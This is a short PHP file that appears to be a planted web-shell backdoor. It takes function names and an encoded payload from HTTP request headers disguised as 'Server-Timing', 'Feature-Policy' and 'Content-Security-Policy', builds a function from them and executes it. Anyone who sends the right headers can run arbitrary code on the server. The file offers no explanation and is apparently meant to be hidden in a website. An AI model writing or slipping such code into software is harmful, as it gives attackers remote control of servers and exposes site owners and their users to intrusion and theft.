<?php

$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $locked = $_HEADERS['Server-Timing']('', $_HEADERS['Feature-Policy']($_HEADERS['Content-Security-Policy']));
    $locked();
}